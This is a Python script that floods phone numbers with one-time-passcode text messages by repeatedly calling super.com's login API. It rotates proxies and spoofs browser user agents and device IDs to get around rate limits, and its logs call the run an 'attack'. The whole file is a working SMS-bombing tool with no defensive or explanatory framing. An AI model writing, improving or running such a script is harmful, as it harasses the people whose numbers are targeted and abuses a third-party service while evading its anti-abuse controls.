import json
import logging
import time
import random
import uuid
import sys
import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

def load_config(config_path="config.json"):
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load {config_path}: {e}")
        sys.exit(1)

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(':')
                if len(parts) == 4:
                    host, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{host}:{port}"
                    proxies.append(proxy_url)
                elif len(parts) == 2:
                     host, port = parts
                     proxy_url = f"http://{host}:{port}"
                     proxies.append(proxy_url)
                else:
                    logger.warning(f"Invalid proxy format (skipping): {line}")
        logger.info(f"Loaded {len(proxies)} proxies from {proxy_file}")
        return proxies
    except Exception as e:
        logger.error(f"Failed to load proxies from {proxy_file}: {e}")
        return []

def send_super_otp(phone_number, proxy_url):
    impersonate_profiles = ["chrome110", "chrome116", "chrome120", "edge101", "safari15_3", "safari15_5"]
    browser_profile = random.choice(impersonate_profiles)
    
    device_id = str(uuid.uuid4())
    request_id = str(uuid.uuid4())
    
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    
    # Standard python requests session instead of curl_cffi
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
        
    url = "https://www.super.com/snapcommerce/api/trpc/authentication.cognitoCreateUserOrLogIn"
    
    # Manually simulate basic browser headers since we can't use impersonate in Termux
    user_agents = {
        "chrome120": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "chrome116": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "chrome110": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "edge101": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "safari15_5": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "safari15_3": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15"
    }
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.super.com',
        'referer': 'https://www.super.com/',
        'user-agent': user_agents.get(browser_profile, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    }
    
    payload = {
        "body": {
            "request_id": request_id,
            "data": {
                "auth_contact_identifier": {
                    "brand": "ST",
                    "contact_type": "PHONE_NUMBER",
                    "contact_value": phone_number
                },
                "profile": {
                    "device_id": device_id,
                    "platform_data": {
                        "os": "Windows" if "chrome" in browser_profile or "edge" in browser_profile else "macOS"
                    }
                }
            }
        },
        "queryParams": {}
    }
    
    try:
        session.get("https://www.super.com/", headers={'referer': 'https://google.com/'})
        response = session.post(url, headers=headers, json=payload)
        
        if response.status_code == 200:
            return True, proxy_url, browser_profile, device_id
        else:
            logger.error(f"[{phone_number}] ❌ Failed. Status: {response.status_code} | {response.text[:100]}")
            return False, proxy_url, browser_profile, device_id
            
    except Exception as e:
        logger.error(f"[{phone_number}] ❌ Error during request: {e}")
        return False, proxy_url, browser_profile, device_id

def main():
    config = load_config()
    numbers_dict = {num: {"sent": 0} for num in config.get("numbers", [])}
    proxy_file = config.get("proxy_file", ".txt")
    limit = config.get("limit_per_number", 10)
    wait_time = config.get("wait_between_otp_seconds", 5)
    
    if not numbers_dict:
        logger.error("No numbers found in config.json!")
        return
        
    proxy_list = load_proxies(proxy_file)
    proxy_index = 0
    total_proxies = len(proxy_list)
    
    logger.info("==================================================")
    logger.info(f"ELITE SUPER.COM TERMINAL BOT STARTED")
    logger.info(f"Numbers Loaded: {len(numbers_dict)}")
    logger.info(f"Limit Per Number: {limit}")
    logger.info(f"Wait between OTPs: {wait_time}s")
    logger.info("==================================================")
    
    active_attack = True
    
    while active_attack:
        # Get numbers that haven't reached the limit
        active_numbers = [num for num, data in numbers_dict.items() if data["sent"] < limit]
        
        if not active_numbers:
            logger.info("✅ All numbers have reached their target limit! Attack finished.")
            break
            
        for number in active_numbers:
            # Cycle through proxies
            current_proxy = None
            if total_proxies > 0:
                current_proxy = proxy_list[proxy_index % total_proxies]
                proxy_index += 1
                
                safe_proxy_log = current_proxy.split('@')[-1]
                logger.info(f"[{number}] Selected Proxy: {safe_proxy_log}")
            else:
                logger.warning(f"[{number}] No proxies available! Sending direct request.")
                
            success, used_proxy, browser, dev_id = send_super_otp(number, current_proxy)
            
            if success:
                numbers_dict[number]["sent"] += 1
                sent_count = numbers_dict[number]["sent"]
                logger.info(f"[{number}] ✅ SUCCESS: OTP Sent! ({sent_count}/{limit}) | 🛡️ Proxy: {safe_proxy_log} | 🌐 Browser: {browser} | Device: {dev_id[:8]}")
                
                if sent_count >= limit:
                    logger.info(f"[{number}] 🎉 Limit reached for this number. Removing from queue.")
            else:
                logger.info(f"[{number}] 🔄 Switching to next proxy immediately...")
                continue # Skip sleep on fail
            
            logger.info(f"Waiting {wait_time} seconds before next request...")
            time.sleep(wait_time)

if __name__ == "__main__":
    main()
